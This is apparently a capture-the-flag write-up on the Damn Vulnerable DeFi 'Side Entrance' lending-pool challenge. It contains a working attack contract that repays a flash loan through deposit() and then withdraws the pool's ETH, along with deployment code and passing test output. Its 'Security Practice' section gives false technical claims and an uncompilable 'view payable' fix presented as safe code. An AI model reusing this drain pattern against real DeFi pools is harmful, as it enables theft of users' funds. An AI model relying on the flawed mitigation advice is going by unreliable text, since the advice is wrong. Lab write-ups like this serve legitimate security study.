<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/4.png">

# Target Contract Review

Given contract.

**SideEntranceLenderPool.sol**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}

```

`deposit()` :  This function allows users to deposit Ether into the lending pool. The deposited Ether is added to the user's balance.

`withdraw()` : Users can withdraw their deposited Ether from the lending pool. The function transfers the Ether from the user's balance back to their address.

`flashLoan()` : This function is the vulnerable part of the contract. It allows anyone to borrow a specified amount of Ether from the lending pool. The borrower must implement the execute() function in the IFlashLoanEtherReceiver interface to define the logic for the flash loan.

Challlenge's message:

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

## Missing State-Modifying Functions

Smart contracts are self-executing programs that automatically enforce the rules and regulations of a contract. One of the main advantages of smart contracts is that they are transparent and immutable, but this also means that once deployed, the code cannot be changed. Therefore, it is important to ensure that the code is secure before deployment.

One potential security pitfall in Solidity is the use of state-modifying functions that are incorrectly labelled as **constant/pure/view** functions. In Solidity versions prior to 0.5.0, it was possible to modify state variables within a constant/pure/view function using assembly code. However, in solc 0.5.0 and later versions, this is no longer possible due to the use of the **STATICCALL** opcode.

The STATICCALL opcode is a **read-only call** that is similar to the CALL opcode, but with the added constraint that **it does not modify the state of the contract**. This opcode was introduced to **improve gas efficiency by allowing the EVM to avoid the overhead of tracking the modifications made by a function**. However, this also means that any state-modifying code that is executed within a function labelled as constant/pure/view will now result in a revert.

For example, consider the following Solidity code:

```solidity
pragma solidity >=0.5.0;

contract MyContract {

  uint256 public myVar;

  function myFunction(uint256 _value) public constant returns (uint256) {
      myVar = _value;
      return myVar;
  }
}
```
This code defines a contract with a public state variable myVar and a state-modifying function myFunction that sets the value of myVar. However, the myFunction function is labelled as constant, which is incorrect because it modifies the state of the contract.

When this contract is compiled with solc 0.5.0 or later, attempting to call the myFunction function will result in a revert because of the use of the STATICCALL opcode. The correct way to label this function would be to remove the constant keyword and label it as **pure** instead, since it does not read or modify the state of the contract.

## Security Practice

There are different ways of missing state-modifying functions that we may come accross in smart contract auditing. What is more, this issue causes a gas increment so you can notify this bug in your report. In this challenge, the **execute()** function should be marked as `view` for prevent the any dangerous override action.

Let's look at these contract examples to understand better.

```solidity
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

// Vulnerable Code
```

```solidity
interface IFlashLoanEtherReceiver {
    function execute() external view payable;
}

// Safe Code
```

As you can see, it is easy to stay secure. The important point is to check the function's features correspond to the process in the function and not neglect to use gas-safer opcodes. You can get more information about opcodes from [here.](https://ethereum.org/en/developers/docs/evm/opcodes/)

# Subverting

The SideEntranceLenderPool contract is part of the Damn Vulnerable DeFi project and is used to simulate a lending pool where users can deposit and withdraw funds. However, this contract has a vulnerability that allows an attacker to exploit it and borrow more funds than they actually have.


The vulnerability in this contract arises from the fact that the flashLoan() function does not check if the borrower has sufficient funds to repay the loan. This allows an attacker to borrow a large amount of Ether from the pool, manipulate the borrowed funds, and then repay the loan with the manipulated funds.

The vulnerability in this contract stems from its implementation of two distinct accounting systems. By exploiting this flaw, we can perform the following sequence of actions:

1. Call the `flashLoan()` function with the maximum possible value for a flash loan.
2. Deposit this loaned amount back into the contract using the `deposit()` function.

This sequence allows us to bypass the verification step in the `flashLoan()` function, which checks if the debt has been repaid. Simultaneously, it allows us to manipulate the internal accounting of the contract. This manipulation grants us the ability to immediately execute the `withdraw()` function on the deposited amount.

The reason behind this manipulation is that the `deposit()` and `withdraw()` functions interact with and update the `balances` mapping, whereas the `flashLoan()` function relies on the contract's balance accessed via `address(this).balance`. This disconnect between the two accounting mechanisms creates an exploitable vulnerability.

```js
// Start
address(this).balance = 1000 Ether
balances(player) = 0
player = 1 Ether

// Get Loan
address(this).balance = 0 Ether
balances(player) = 0
player = 1001 Ether

// Repay Loan via Deposit
address(this).balance = 1000 Ether
balances(player) = 1000
player = 1 Ether

// Withdraw The Ether
address(this).balance = 0 Ether
balances(player) = 0
player = 1001 Ether
```
Here is the our attack contract:

```solidity
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance{

    SideEntranceLenderPool pool;

    function attack(address _pool)external payable{
        pool = SideEntranceLenderPool(_pool);
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute()external payable{
        pool.deposit{value: msg.value}();
    }

    fallback() external payable{}

}
```

```js
const AttackFactory = await ethers.getContractFactory('AttackSideEntrance', deployer);
attack = await AttackFactory.deploy();
await attack.connect(player).attack(pool.address);
```

Solve the challenge.

```powershell
 [Challenge] Side entrance
    ✔ Execution (44ms)


  1 passing (1s)

Done in 2.56s.
```


**_by wasny0ps_**
